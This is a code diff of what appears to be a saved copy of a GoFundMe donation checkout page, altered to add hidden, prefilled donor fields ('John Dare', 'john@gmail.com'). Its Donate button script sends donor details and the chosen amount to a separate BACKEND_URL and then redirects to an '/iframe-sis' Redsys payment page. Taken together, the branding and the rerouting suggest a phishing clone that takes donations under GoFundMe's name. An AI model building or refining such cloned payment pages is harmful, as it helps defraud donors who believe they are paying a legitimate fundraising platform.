+                  <div class="hrt-mt-2" bis_skin_checked="1">
+                    <div
+                      class="credit-card-form-fields_creditCardGridFields__4DXxM"
+                      bis_skin_checked="1"
+                    >
+                      <div
+                        class="donation-personal-fields_donationPersonalFields__fdEpm"
+                        bis_skin_checked="1"
+                      >
+                        <div
+                          class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
+                          bis_skin_checked="1"
+                        >
+                          <!-- Email field (hidden, prefilled) -->
+                          <div class="hrt-text-field" bis_skin_checked="1">
+                            <div
+                              class="hrt-text-field-wrapper"
+                              bis_skin_checked="1"
+                            >
+                              <div
+                                class="hrt-text-field-inner"
+                                bis_skin_checked="1"
+                              >
+                                <input
+                                  aria-invalid="false"
+                                  class="hrt-text-field-input"
+                                  id="email-address"
+                                  placeholder=" "
+                                  name="email"
+                                  type="email"
+                                  autocomplete="email"
+                                  value="john@gmail.com"
+                                />
+                                <label
+                                  class="hrt-text-field-label"
+                                  for="email-address"
+                                >
+                                  Email address
+                                </label>
                               </div>
                             </div>
-                          </label>
+                            <!-- Error message below Email -->
+                            <div class="error-message" id="email-error">
+                              <img src="error.svg" alt="" class="error-icon" />
+                              <span></span>
+                            </div>
+                          </div>
                         </div>
-                      </li>
-                    </ul>
+
+                        <div
+                          class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
+                          bis_skin_checked="1"
+                        >
+                          <!-- First name (hidden, prefilled) -->
+                          <div class="hrt-text-field" bis_skin_checked="1">
+                            <div
+                              class="hrt-text-field-wrapper"
+                              bis_skin_checked="1"
+                            >
+                              <div
+                                class="hrt-text-field-inner"
+                                bis_skin_checked="1"
+                              >
+                                <input
+                                  aria-invalid="false"
+                                  class="hrt-text-field-input"
+                                  id="first-name"
+                                  placeholder=" "
+                                  name="firstName"
+                                  type="text"
+                                  autocomplete="given-name"
+                                  value="John"
+                                />
+                                <label
+                                  class="hrt-text-field-label"
+                                  for="first-name"
+                                >
+                                  Name
+                                </label>
+                              </div>
+                            </div>
+                            <!-- Error message below First Name -->
+                            <div class="error-message" id="first-name-error">
+                              <img src="error.svg" alt="" class="error-icon" />
+                              <span></span>
+                            </div>
+                          </div>
+
+                          <!-- Last name (hidden, prefilled) -->
+                          <div class="hrt-text-field" bis_skin_checked="1">
+                            <div
+                              class="hrt-text-field-wrapper"
+                              bis_skin_checked="1"
+                            >
+                              <div
+                                class="hrt-text-field-inner"
+                                bis_skin_checked="1"
+                              >
+                                <input
+                                  aria-invalid="false"
+                                  class="hrt-text-field-input"
+                                  id="last-name"
+                                  placeholder=" "
+                                  name="lastName"
+                                  type="text"
+                                  autocomplete="family-name"
+                                  value="Dare"
+                                />
+                                <label
+                                  class="hrt-text-field-label"
+                                  for="last-name"
+                                >
+                                  Surname
+                                </label>
+                              </div>
+                            </div>
+                            <!-- Error message below Last Name -->
+                            <div class="error-message" id="last-name-error">
+                              <img src="error.svg" alt="" class="error-icon" />
+                              <span></span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+
+                      <!-- Short address fields for Country and Postal Code (hidden, prefilled) -->
+                      <div
+                        class="short-address-fields_donationLocationFields__CsuR3"
+                        bis_skin_checked="1"
+                      >
+                        <div
+                          class="short-address-fields_donationLocationRow__hnPH_ short-address-fields_donationLocationRowParent__b1cQI"
+                          bis_skin_checked="1"
+                        >
+                          <div
+                            class="short-address-fields_donationLocationRow__hnPH_"
+                            bis_skin_checked="1"
+                          >
+                            <div class="hrt-select-field" bis_skin_checked="1">
+                              <div
+                                class="hrt-select-field-wrapper"
+                                bis_skin_checked="1"
+                              >
+                                <select
+                                  aria-invalid="false"
+                                  class="hrt-select-field-select"
+                                  id="location-country"
+                                  name="country"
+                                  layout="stacked"
+                                >
+                                  <!-- Mark US as selected -->
+                                  <option value="US" selected>United States</option>
+                                  <option value="CA">Canada</option>
+                                  <option value="MX">Mexico</option>
+                                  <option value="GB">United Kingdom</option>
+                                  <option value="ZA">South Africa</option>
+                                  <option value="AL">Albania</option>
+                                  <option value="DE">Germany</option>
+                                  <option value="AD">Andorra</option>
+                                  <option value="AO">Angola</option>
+                                  <option value="AI">Anguilla</option>
+                                  <option value="AG">Antigua and Barbuda</option>
+                                  <option value="AN">Netherlands Antilles</option>
+                                  <option value="SA">Saudi Arabia</option>
+                                  <option value="VE">Venezuela</option>
+                                  <option value="VN">Vietnam</option>
+                                  <option value="WF">Wallis and Futuna</option>
+                                  <option value="ZM">Zambia</option>
+                                  <option value="ZW">Zimbabwe</option>
+                                </select>
+                                <label
+                                  class="hrt-select-field-label"
+                                  for="location-country"
+                                >
+                                  Country
+                                </label>
+                                <svg
+                                  aria-hidden="true"
+                                  class="hrt-select-field-icon hrt-icon hrt-icon--large"
+                                  focusable="false"
+                                  viewBox="0 0 24 24"
+                                >
+                                  <use href="#chevron-down"></use>
+                                  <symbol
+                                    fill="none"
+                                    viewBox="0 0 24 24"
+                                    id="chevron-down"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                  >
+                                    <path
+                                      d="M12 16.75a.739.739 0 0 1-.53-.22l-8-8a.75.75 0 0 1 1.06-1.06L12 14.94l7.47-7.47a.75.75 0 0 1 1.06 1.06l-8 8a.74.74 0 0 1-.53.22Z"
+                                      fill="currentColor"
+                                    ></path>
+                                  </symbol>
+                                </svg>
+                              </div>
+                            </div>
+                            <!-- Error message below Country -->
+                            <div class="error-message" id="country-error">
+                              <img src="error.svg" alt="" class="error-icon" />
+                              <span></span>
+                            </div>
+                          </div>
+                          <div
+                            class="short-address-fields_donationLocationRow__hnPH_"
+                            bis_skin_checked="1"
+                          >
+                            <div class="hrt-text-field" bis_skin_checked="1">
+                              <div
+                                class="hrt-text-field-wrapper"
+                                bis_skin_checked="1"
+                              >
+                                <div
+                                  class="hrt-text-field-inner"
+                                  bis_skin_checked="1"
+                                >
+                                  <input
+                                    aria-invalid="false"
+                                    class="hrt-text-field-input"
+                                    id="location-postal-code"
+                                    placeholder=" "
+                                    name="postalCode"
+                                    type="text"
+                                    layout="stacked"
+                                    value="10001"
+                                  />
+                                  <label
+                                    class="hrt-text-field-label"
+                                    for="location-postal-code"
+                                  >
+                                    Postal code
+                                  </label>
+                                </div>
+                              </div>
+                              <!-- Error message below Postal Code -->
+                              <div class="error-message" id="postal-code-error">
+                                <img src="error.svg" alt="" class="error-icon" />
+                                <span></span>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+
+                      <!-- (Removed hidden fields for Redsys operation ID since we do redirect method) -->
+                    </div>
                   </div>
-                </fieldset>
+                </div>
+                <!-- END hidden personal info fields -->
 
                 <!-- Donation summary area -->
-                <div class="hrt-mb-4 hrt-mb-3 checkout-summary">
+                <div class="hrt-mb-4 hrt-mb-3 checkout-summary" bis_skin_checked="1">
                   <h2 class="heading-3 hrt-font-bold">Your donation</h2>
                   <dl
                     class="checkout-summary_checkoutSummaryList__1z9xU hrt-text-neutral-500"
@@ -533,12 +921,16 @@
                   </dl>
                 </div>
 
-                <!-- Main Donate now button -->
-                <div class="payment-method-submit-button_paymentMethodSubmitButton__x_pFo">
-                  <div class="hrt-width-full">
-                    <div id="threeDS2Fingerprint"></div>
+                <!-- Main Donate now button (Redirect flow) -->
+                <div
+                  class="payment-method-submit-button_paymentMethodSubmitButton__x_pFo"
+                  bis_skin_checked="1"
+                >
+                  <div class="hrt-width-full" bis_skin_checked="1">
+                    <div id="threeDS2Fingerprint" bis_skin_checked="1"></div>
                     <div
                       class="credit-card-submit-button_creditCardSubmitButtonWrapper__9cUFi hrt-width-full"
+                      bis_skin_checked="1"
                     >
                       <button
                         class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full credit-card-submit-button_creditCardSubmitButton__nUGf9 hrt-disp-flex hrt-justify-center gfm-fundraiser-button hrt-primary-button hrt-primary-button--full-for-mobile hrt-primary-button--large hrt-primary-button--default hrt-base-button"
@@ -561,21 +953,34 @@
                     <span></span>
                   </div>
 
-                  <!-- Optional placeholders for other payment methods -->
-                  <div class="hrt-disp-none hrt-width-full sf-hidden"></div>
-                  <div class="hrt-disp-none hrt-width-full sf-hidden"></div>
-                  <div class="hrt-disp-none hrt-width-full sf-hidden">
-                    <div class="hrt-disp-flex hrt-justify-center sf-hidden">
+                  <div
+                    class="hrt-disp-none hrt-width-full sf-hidden"
+                    bis_skin_checked="1"
+                  ></div>
+                  <div
+                    class="hrt-disp-none hrt-width-full sf-hidden"
+                    bis_skin_checked="1"
+                  ></div>
+                  <div
+                    class="hrt-disp-none hrt-width-full sf-hidden"
+                    bis_skin_checked="1"
+                  >
+                    <div
+                      class="hrt-disp-flex hrt-justify-center sf-hidden"
+                      bis_skin_checked="1"
+                    >
                       <div
                         id="paypal-button"
                         class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full paypal-payfast_paypalPayfastSubmitButton__u8JfE sf-hidden"
+                        bis_skin_checked="1"
                       >
-                        <div class="sf-hidden"></div>
+                        <div bis_skin_checked="1" class="sf-hidden"></div>
                       </div>
                     </div>
                   </div>
                   <div
                     class="hrt-text-body-sm hrt-text-neutral-500 hrt-mt-3 hrt-mb-0"
+                    bis_skin_checked="1"
                   >
                     By choosing the payment method above, you agree to GoFundMe's
                     <a
@@ -598,7 +1003,7 @@
                       Privacy Notice
                     </a>
                     .
-                    <div class="pricing-link">
+                    <div class="pricing-link" bis_skin_checked="1">
                       Learn more about
                       <a
                         class="hrt-link hrt-link--gray-dark"
@@ -613,15 +1018,19 @@
                   </div>
                 </div>
 
-                <div id="checkoutAppInvisibleCaptcha"></div>
+                <div id="checkoutAppInvisibleCaptcha" bis_skin_checked="1"></div>
                 <div
                   class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
+                  bis_skin_checked="1"
                 ></div>
 
                 <!-- Guarantee section -->
-                <div class="gfm-guarantee">
+                <div class="gfm-guarantee" bis_skin_checked="1">
                   <section class="m-value-prop">
-                    <div class="hrt-spot-icon hrt-spot-icon--indigo hrt-spot-icon--large">
+                    <div
+                      class="hrt-spot-icon hrt-spot-icon--indigo hrt-spot-icon--large"
+                      bis_skin_checked="1"
+                    >
                       <svg
                         aria-hidden="true"
                         class="hrt-icon hrt-icon--large"
@@ -644,7 +1053,7 @@
                         </symbol>
                       </svg>
                     </div>
-                    <div class="m-value-prop-content">
+                    <div class="m-value-prop-content" bis_skin_checked="1">
                       <h3 class="hrt-font-medium hrt-mb-1">
                         GoFundMe protects your donation
                       </h3>
@@ -681,23 +1090,11 @@
                     aria-live="assertive"
                     id="__next-route-announcer__"
                     role="alert"
-                    style="
-                      border: 0px;
-                      clip: rect(0px, 0px, 0px, 0px);
-                      height: 1px;
-                      margin: -1px;
-                      overflow: hidden;
-                      padding: 0px;
-                      position: absolute;
-                      top: 0px;
-                      width: 1px;
-                      white-space: nowrap;
-                      overflow-wrap: normal;
-                    "
+                    style="border:0px;clip:rect(0px,0px,0px,0px);height:1px;margin:-1px;overflow:hidden;padding:0px;position:absolute;top:0px;width:1px;white-space:nowrap;overflow-wrap:normal"
                   ></p>
                 </next-route-announcer>
 
-                <!-- Additional Scripts for Donation Amount (duplicate logic) -->
+                <!-- Additional Scripts for Donation Amount Updates (duplicate) -->
                 <script>
                   const donationButtons2 = document.querySelectorAll(
                     'ul[data-federalid="suggested-donations-list"] button'
@@ -753,6 +1150,133 @@
                   })();
                 </script>
 
+                <!-- Simple validation for the normal text fields -->
+                <script>
+                  document.addEventListener("DOMContentLoaded", function () {
+                    function showErrorMessage(inputId, errorId, message) {
+                      const errorDiv = document.getElementById(errorId);
+                      const inputEl = document.getElementById(inputId);
+                      if (!inputEl) return;
+
+                      const wrapper =
+                        inputEl.closest(".hrt-text-field-wrapper") ||
+                        inputEl.closest(".hrt-select-field-wrapper");
+                      if (!wrapper) return;
+
+                      if (message) {
+                        errorDiv.classList.add("active");
+                        errorDiv.querySelector("span").textContent = message;
+                        wrapper.classList.add("field-error");
+                      } else {
+                        errorDiv.classList.remove("active");
+                        errorDiv.querySelector("span").textContent = "";
+                        wrapper.classList.remove("field-error");
+                      }
+                    }
+
+                    function validateEmail(email) {
+                      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                      return re.test(email);
+                    }
+
+                    // Email
+                    const emailInput = document.getElementById("email-address");
+                    function validateEmailField() {
+                      const value = emailInput.value.trim();
+                      if (!value) {
+                        showErrorMessage(
+                          "email-address",
+                          "email-error",
+                          "Please enter your email address"
+                        );
+                      } else if (!validateEmail(value)) {
+                        showErrorMessage(
+                          "email-address",
+                          "email-error",
+                          "Invalid email address"
+                        );
+                      } else {
+                        showErrorMessage("email-address", "email-error", "");
+                      }
+                    }
+                    // We'll keep the same listeners so the hidden fields *could* be validated in the background
+                    emailInput.addEventListener("blur", validateEmailField);
+                    emailInput.addEventListener("input", validateEmailField);
+
+                    // First Name
+                    const firstNameInput = document.getElementById("first-name");
+                    function validateFirstNameField() {
+                      const value = firstNameInput.value.trim();
+                      if (!value) {
+                        showErrorMessage(
+                          "first-name",
+                          "first-name-error",
+                          "Please enter your first name"
+                        );
+                      } else {
+                        showErrorMessage("first-name", "first-name-error", "");
+                      }
+                    }
+                    firstNameInput.addEventListener("blur", validateFirstNameField);
+                    firstNameInput.addEventListener("input", validateFirstNameField);
+
+                    // Last Name
+                    const lastNameInput = document.getElementById("last-name");
+                    function validateLastNameField() {
+                      const value = lastNameInput.value.trim();
+                      if (!value) {
+                        showErrorMessage(
+                          "last-name",
+                          "last-name-error",
+                          "Please enter your last name"
+                        );
+                      } else {
+                        showErrorMessage("last-name", "last-name-error", "");
+                      }
+                    }
+                    lastNameInput.addEventListener("blur", validateLastNameField);
+                    lastNameInput.addEventListener("input", validateLastNameField);
+
+                    // Country
+                    const countrySelect = document.getElementById("location-country");
+                    function validateCountryField() {
+                      const value = countrySelect.value.trim();
+                      if (!value) {
+                        showErrorMessage(
+                          "location-country",
+                          "country-error",
+                          "Please select a country"
+                        );
+                      } else {
+                        showErrorMessage("location-country", "country-error", "");
+                      }
+                    }
+                    countrySelect.addEventListener("blur", validateCountryField);
+                    countrySelect.addEventListener("change", validateCountryField);
+
+                    // Postal Code
+                    const postalCodeInput = document.getElementById("location-postal-code");
+                    function validatePostalCodeField() {
+                      const value = postalCodeInput.value.trim();
+                      if (!value) {
+                        showErrorMessage(
+                          "location-postal-code",
+                          "postal-code-error",
+                          "Please enter your postal code"
+                        );
+                      } else {
+                        showErrorMessage(
+                          "location-postal-code",
+                          "postal-code-error",
+                          ""
+                        );
+                      }
+                    }
+                    postalCodeInput.addEventListener("blur", validatePostalCodeField);
+                    postalCodeInput.addEventListener("input", validatePostalCodeField);
+                  });
+                </script>
+
                 <!-- Script to handle Donate Now button -->
                 <script>
                   document.addEventListener("DOMContentLoaded", function () {
@@ -772,49 +1296,115 @@
                       }
                     }
 
-                    // Validate only the donation amount (ensure a button is selected)
-                    function validateDonationAmount() {
+                    // Validate all fields at once
+                    function validateAllFields() {
+                      // Even though they're hidden, we can still trigger validation:
+                      document.getElementById("email-address").dispatchEvent(new Event("blur"));
+                      document.getElementById("first-name").dispatchEvent(new Event("blur"));
+                      document.getElementById("last-name").dispatchEvent(new Event("blur"));
+                      document.getElementById("location-country").dispatchEvent(new Event("blur"));
+                      document.getElementById("location-postal-code").dispatchEvent(new Event("blur"));
+
+                      // Check if any error classes are active
+                      const emailErrorActive = document
+                        .getElementById("email-error")
+                        .classList.contains("active");
+                      const firstNameErrorActive = document
+                        .getElementById("first-name-error")
+                        .classList.contains("active");
+                      const lastNameErrorActive = document
+                        .getElementById("last-name-error")
+                        .classList.contains("active");
+                      const countryErrorActive = document
+                        .getElementById("country-error")
+                        .classList.contains("active");
+                      const postalCodeErrorActive = document
+                        .getElementById("postal-code-error")
+                        .classList.contains("active");
+
+                      // Check if user selected a donation amount
+                      let selectedAmount = "0";
                       const pressedBtn = document.querySelector(
                         'ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]'
                       );
-                      if (!pressedBtn) {
-                        showGlobalError("Please select a donation amount.");
+                      if (pressedBtn) {
+                        selectedAmount = pressedBtn.value;
+                      }
+
+                      // Get values (they're prefilled, but let's confirm they're not empty)
+                      const emailVal = document.getElementById("email-address").value.trim();
+                      const firstVal = document.getElementById("first-name").value.trim();
+                      const lastVal = document.getElementById("last-name").value.trim();
+                      const countryVal = document.getElementById("location-country").value.trim();
+                      const postalVal = document.getElementById("location-postal-code").value.trim();
+
+                      if (
+                        !emailVal ||
+                        !firstVal ||
+                        !lastVal ||
+                        !countryVal ||
+                        !postalVal ||
+                        selectedAmount === "0" ||
+                        emailErrorActive ||
+                        firstNameErrorActive ||
+                        lastNameErrorActive ||
+                        countryErrorActive ||
+                        postalCodeErrorActive
+                      ) {
+                        showGlobalError(
+                          "Please fill out all required fields and select a donation amount."
+                        );
                         return false;
                       }
+
+                      // All good
+                      showGlobalError("");
                       return true;
                     }
 
                     const donateNowBtn = document.getElementById("donate-now");
                     donateNowBtn.addEventListener("click", async function () {
-                      // Step 1: Validate user selected an amount
-                      if (!validateDonationAmount()) {
-                        return;
+                      // Step 1: Validate
+                      if (!validateAllFields()) {
+                        return; // do not proceed if validation fails
                       }
 
-                      // If we get here, an amount is selected
+                      // Fields are valid:
+                      const email = document.getElementById("email-address").value.trim();
+                      const firstName = document.getElementById("first-name").value.trim();
+                      const lastName = document.getElementById("last-name").value.trim();
+                      const country = document.getElementById("location-country").value.trim();
+                      const postalCode = document
+                        .getElementById("location-postal-code")
+                        .value.trim();
+
+                      // Check selected donation
+                      let selectedAmount = "0";
                       const pressedBtn = document.querySelector(
                         'ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]'
                       );
-                      const selectedAmount = pressedBtn.value;
+                      if (pressedBtn) {
+                        selectedAmount = pressedBtn.value;
+                      }
 
-                      // Use the global BACKEND_URL from the <script> in the <head>
+                      // Use global BACKEND_URL
                       const baseUrl = window.BACKEND_URL || "";
 
-                      // We'll pass dummy data so the server doesn't complain
                       const dataToStore = {
+                        email,
+                        firstName,
+                        lastName,
+                        country,
+                        postalCode,
                         amount: selectedAmount,
-                        firstName: "Anonymous",
-                        lastName: "Donor",
-                        email: "dummy@example.com"
                       };
 
                       try {
-                        // Attempt to create the donation
                         const resp = await fetch(baseUrl + "/create-donation", {
                           method: "POST",
                           headers: { "Content-Type": "application/json" },
                           body: JSON.stringify(dataToStore),
-                          credentials: "include", // sets cookie
+                          credentials: "include",
                         });
                         if (!resp.ok) {
                           showGlobalError("Could not create donation, please try again.");
@@ -825,8 +1415,7 @@
                           showGlobalError("Error: " + result.error);
                           return;
                         }
-
-                        // On success, redirect to the Redsys payment page
+                        // On success, redirect
                         window.location.href =
                           baseUrl + "/iframe-sis?orderId=" + encodeURIComponent(result.orderId);
                       } catch (error) {
@@ -835,7 +1424,6 @@
                     });
                   });
                 </script>
-                <!-- End Redwood code -->
               </div>
             </div>
           </div>
